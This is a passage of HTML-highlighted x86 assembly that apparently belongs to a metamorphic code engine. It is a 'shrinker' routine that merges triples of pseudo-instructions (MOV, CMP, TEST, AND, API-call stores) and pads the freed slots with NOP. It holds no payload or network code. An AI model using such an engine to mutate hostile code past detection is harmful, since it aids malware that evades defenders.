                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">          </span><span class="sc1">; TEST?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Triple_Next03</span><span class="sc0">
        </span><span class="sc5">@@Triple_Next02_CheckCMPTESTRegMem</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">@@Triple_Next02_CheckCMPTESTMemReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">78h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">          </span><span class="sc1">; CMP?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@EndCompressed</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">          </span><span class="sc1">; TEST?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@EndCompressed</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">          </span><span class="sc1">; AND?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Triple_Next02_SetTEST</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">          </span><span class="sc1">; Transform from SUB to CMP</span><span class="sc0">
        </span><span class="sc5">@@Triple_Next02_ConvertInstruction</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Set the instruction</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@EndCompressed</span><span class="sc0">
        </span><span class="sc5">@@Triple_Next02_SetTEST</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">          </span><span class="sc1">; Transform from AND to TEST</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Triple_Next02_ConvertInstruction</span><span class="sc0">
        </span><span class="sc5">@@Triple_Next02_ContCheck</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;mov     al, [edi]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Fh</span><span class="sc0">           </span><span class="sc1">; Check the 3rd instruction for a</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Triple_Next03</span><span class="sc0">     </span><span class="sc1">; common operation</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ch</span><span class="sc0">           </span><span class="sc1">; Check now the 2nd instruction</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@Triple_Next02_CommonOperation</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">       </span><span class="sc1">; Check if it's 8 bits instructions</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Triple_Next03</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ch</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@Triple_Next03</span><span class="sc0">
        </span><span class="sc5">@@Triple_Next02_CommonOperation</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0">         </span><span class="sc1">; Check for APICALL_STORE</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Triple_Next02_OPMemReg</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">78h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">          </span><span class="sc1">; Check for a common instruction</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Triple_Next02_00</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">; Check if it's OP Reg,Mem in 2nd</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Triple_Next02_OPMemReg</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Triple_Next02_01</span><span class="sc0">
        </span><span class="sc5">@@Triple_Next02_00</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; Check if it's OP Mem,Reg in 2nd</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Triple_Next02_OPMemReg</span><span class="sc0">
        </span><span class="sc5">@@Triple_Next02_01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; OP Mem,Imm?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Triple_End</span><span class="sc0">
        </span><span class="sc5">@@Triple_Next02_OPMemImm</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">@@Triple_Next02_OPMemReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Check Mem operands to see if the</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Triple_End</span><span class="sc0">        </span><span class="sc1">; instructions use the same one (if</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; not, we can't compress them,</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Triple_End</span><span class="sc0">        </span><span class="sc1">; obviously)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Triple_End</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Triple_End</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Triple_End</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Triple_End</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Set the new Mem operand</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc5">@@Triple_Next_SetNOP_1_3</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">         </span><span class="sc1">; Overwrite with NOP the first and</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@EndCompressed</span><span class="sc0">     </span><span class="sc1">; third instruction, since we used</span><span class="sc0">
                                          </span><span class="sc1">; the second one to put the new</span><span class="sc0">
                                          </span><span class="sc1">; instruction.</span><span class="sc0">
      </span><span class="sc5">@@Triple_Next03</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">44h</span><span class="sc0">           </span><span class="sc1">; Check for MOV Mem,Imm</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Triple_Next04</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">42h</span><span class="sc0">           </span><span class="sc1">; MOV Mem,Imm + xxx + MOV Reg,Mem?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Triple_Next03_Constr00</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc0">           </span><span class="sc1">; Jcc in 3rd?</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Triple_Next04</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@Triple_Next04</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">@@Triple_Next03_Check_CMP_TEST</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Ah</span><span class="sc0">           </span><span class="sc1">; CMP Reg,Mem (8 or 32 bits)</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Triple_Next03_CMPRegImm</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ah</span><span class="sc0">           </span><span class="sc1">; TEST Reg,Mem (" " " ")</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Triple_End</span><span class="sc0">
        </span><span class="sc5">@@Triple_Next03_CMPRegImm</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">@@Triple_Next03_TESTRegImm</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Get 2nd instruction</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc0">         </span><span class="sc1">; Convert it to OP Reg,Imm</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">         </span><span class="sc1">; Set it at 1st instruction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@EndCompressed</span><span class="sc0">
        </span><span class="sc5">@@Triple_Next03_Constr00</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0">         </span><span class="sc1">; Check if it's APICALL_STORE</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Triple_Next03_Common_F6</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ch</span><span class="sc0">           </span><span class="sc1">; Check if it's a common operation</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@Triple_Next04</span><span class="sc0">
        </span><span class="sc5">@@Triple_Next03_Common</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">78h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">          </span><span class="sc1">; Common operation?</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Triple_Next03_00</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">; Check if it's OP Reg,Mem</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Triple_Next03_Common_F6</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Triple_End</span><span class="sc0">
        </span><span class="sc5">@@Triple_Next03_00</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; OP Mem,Reg?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Triple_End</span><span class="sc0">
        </span><span class="sc5">@@Triple_Next03_Common_F6</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; If the Mem operands are the same,</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; merge them</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Triple_End</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Triple_End</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Triple_End</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Triple_End</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Triple_Next_SetInstruction</span><span class="sc0">


      </span><span class="sc5">@@Triple_Next04</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">44h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">    </span><span class="sc1">; Same as above, but 8 bits instructs.</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Triple__Next04</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">42h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Triple_Next04_Constr00</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Triple__Next04</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@Triple__Next04</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Triple_Next03_Check_CMP_TEST</span><span class="sc0">
        </span><span class="sc5">@@Triple_Next04_Constr00</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Triple__Next04</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ch</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@Triple_Next03_Common</span><span class="sc0">

      </span><span class="sc5">@@Triple__Next04</span><span class="sc4">:</span><span class="sc0">


